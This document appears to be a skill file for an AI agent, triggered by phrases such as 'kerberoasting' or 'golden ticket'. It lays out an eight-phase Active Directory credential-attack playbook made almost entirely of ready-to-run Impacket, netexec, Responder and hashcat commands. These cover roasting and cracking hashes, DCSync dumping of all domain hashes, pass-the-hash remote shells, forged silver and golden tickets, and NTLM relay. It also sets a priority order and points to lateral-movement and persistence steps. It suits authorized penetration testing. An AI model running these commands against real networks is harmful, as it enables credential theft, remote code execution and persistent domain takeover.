---
name: ad-attacks
description: "Active Directory credential attacks. Kerberoasting, AS-REP roasting, DCSync, Pass-the-Hash, Pass-the-Ticket, Silver Ticket, Golden Ticket, NTLM relay. Via Impacket + netexec (no Windows required). Triggers: 'kerberoasting', 'asreproasting', 'as-rep roast', 'dcsync', 'pass the hash', 'ntlm relay', 'overpass the hash', 'golden ticket', 'silver ticket', 'krbtgt hash', 'active directory attacks', 'ad credentials'."
---

# Active Directory Credential Attacks

Kerberoasting → AS-REP roasting → DCSync → Pass-the-Hash → Pass-the-Ticket → Silver/Golden Ticket → NTLM relay.
All via Impacket CLI — no Windows required.

## Install

```bash
pip install impacket --break-system-packages
sudo apt-get install -y krb5-user hashcat john
```

---

## Phase 1: Kerberoasting

```bash

GetUserSPNs.py 'DOMAIN.COM/user:password' -dc-ip <DC_IP> -request \
  -outputfile kerberoast_hashes.txt

GetUserSPNs.py 'DOMAIN.COM/user' -hashes ':NTHASH' -dc-ip <DC_IP> -request \
  -outputfile kerberoast_hashes.txt

KRB5CCNAME=/tmp/user.ccache GetUserSPNs.py 'DOMAIN.COM/user' \
  -dc-ip <DC_IP> -k -no-pass -request

hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# $krb5tgs$23$* = RC4     → mode 13100 (fastest)
# $krb5tgs$18$* = AES256  → mode 19700
# $krb5tgs$17$* = AES128  → mode 19600
```

---

## Phase 2: AS-REP Roasting

```bash

GetNPUsers.py 'DOMAIN.COM/' -usersfile usernames.txt -dc-ip <DC_IP> \
  -no-pass -format hashcat -outputfile asrep_hashes.txt

GetNPUsers.py 'DOMAIN.COM/user:password' -dc-ip <DC_IP> -request \
  -format hashcat -outputfile asrep_hashes.txt

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

---

## Phase 3: DCSync — Dump All Hashes

```bash

secretsdump.py 'DOMAIN.COM/admin:password@<DC_IP>'

secretsdump.py -hashes ':NTHASH' 'DOMAIN.COM/admin@<DC_IP>'

secretsdump.py 'DOMAIN.COM/admin:password@<DC_IP>' -just-dc-user krbtgt
secretsdump.py 'DOMAIN.COM/admin:password@<DC_IP>' -just-dc-user administrator

secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL

```

---

## Phase 4: Pass-the-Hash

```bash

psexec.py   -hashes ':NTHASH' 'DOMAIN.COM/administrator@<TARGET>'   # shell
wmiexec.py  -hashes ':NTHASH' 'DOMAIN.COM/administrator@<TARGET>'   # quieter
smbexec.py  -hashes ':NTHASH' 'DOMAIN.COM/administrator@<TARGET>'
atexec.py   -hashes ':NTHASH' 'DOMAIN.COM/administrator@<TARGET>' "whoami"

nxc smb <TARGET> -u administrator -H 'NTHASH' --exec-method wmiexec -x "whoami"
nxc smb 10.10.10.0/24 -u administrator -H 'NTHASH'   # spray subnet

xfreerdp /v:<TARGET> /u:administrator /pth:NTHASH /cert:ignore +clipboard
```

---

## Phase 5: Pass-the-Ticket

```bash
getTGT.py 'DOMAIN.COM/user:password' -dc-ip <DC_IP>   # → user.ccache

getTGT.py 'DOMAIN.COM/user' -hashes ':NTHASH' -dc-ip <DC_IP>

export KRB5CCNAME=/tmp/user.ccache
klist   # verify
wmiexec.py -k -no-pass 'DOMAIN.COM/user@server.domain.com'
smbclient.py -k -no-pass 'DOMAIN.COM/user@server.domain.com'

getST.py 'DOMAIN.COM/computer$' -spn 'cifs/target.domain.com' \
  -hashes ':NTHASH' -impersonate Administrator -dc-ip <DC_IP>
export KRB5CCNAME=Administrator@cifs_target.domain.com@DOMAIN.COM.ccache
smbclient.py -k -no-pass 'DOMAIN.COM/Administrator@target.domain.com'
```

---

## Phase 6: Silver Ticket

```bash

lookupsid.py 'DOMAIN.COM/user:password@<DC_IP>'

ticketer.py -nthash <SERVICE_NTHASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain DOMAIN.COM \
  -spn cifs/server.domain.com \
  administrator

export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass 'DOMAIN.COM/administrator@server.domain.com'

```

---

## Phase 7: Golden Ticket

```bash

secretsdump.py 'DOMAIN.COM/admin:password@<DC_IP>' -just-dc-user krbtgt

lookupsid.py 'DOMAIN.COM/admin:password@<DC_IP>' | grep "Domain SID"

ticketer.py -nthash <KRBTGT_NTHASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain DOMAIN.COM \
  administrator

export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass 'DOMAIN.COM/administrator@dc01.domain.com'
secretsdump.py -k -no-pass 'DOMAIN.COM/administrator@dc01.domain.com'
```

---

## Phase 8: NTLM Relay

```bash
# Capture NTLM auth and relay to authenticate as victim

sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

python3 /opt/Responder/Responder.py -I eth0 -v

ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t smb://<TARGET> -smb2support -i   # interactive shell
ntlmrelayx.py -t ldap://<DC_IP> --delegate-access  # delegate access via LDAP

ntlmrelayx.py -t ldap://<DC_IP> -smb2support --add-computer NEWPC$ P@ssw0rd123
```

---

## Hash Cracking Reference

```bash
hashcat -m  1000 ntlm.txt    rockyou.txt   # NTLM
hashcat -m  5600 ntlmv2.txt  rockyou.txt   # NTLMv2 (Responder)
hashcat -m 13100 kerb.txt    rockyou.txt   # Kerberoast RC4
hashcat -m 18200 asrep.txt   rockyou.txt   # AS-REP
hashcat -m  1000 hashes.txt  rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m  1000 hashes.txt  -a 3 '?u?l?l?l?l?d?d?d'   # mask attack
```

---

## Priority Order

1. AS-REP unauthenticated (no creds needed — try first with username list)
2. Kerberoast RC4 accounts with `admincount=1`
3. DCSync when DA/replication rights obtained
4. Silver ticket → stealthy service access
5. Golden ticket → persistent DA after KRBTGT dump

## Output

Save to `.omop/engagement/ad/`:
- `kerberoast_hashes.txt`, `asrep_hashes.txt` — hashes for cracking
- `cracked_creds.txt` — cracked credentials
- `domain_hashes.txt` — DCSync output
- `golden_ticket.ccache` — golden ticket artifact

## Next Phase

→ `ad-netexec` for lateral movement with obtained credentials
→ `red-lateral` for BloodHound attack path analysis
→ `red-persistence` for persistence establishment
